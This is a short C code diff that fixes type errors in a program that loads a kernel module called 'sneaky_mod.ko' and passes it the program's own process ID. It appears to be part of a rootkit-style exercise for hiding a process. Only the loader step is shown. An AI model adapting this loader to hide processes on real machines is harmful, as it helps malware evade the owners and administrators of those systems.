@@ -32,7 +32,7 @@ void append_to_file(char * file, char * content) {
 }
 
 void load_sneaky_module() {
-  char * command[60]; 
+  char command[60]; 
   snprintf(command, 60, "insmod sneaky_mod.ko pid=%d", (int)getpid());
   int res = system(command);
   if (res == -1) {
@@ -42,7 +42,7 @@ void load_sneaky_module() {
 }
 
 void read_from_keyboard() {
-  while (getchar() != "q") {
+  while (getchar() != 'q') {
   }
 }
 
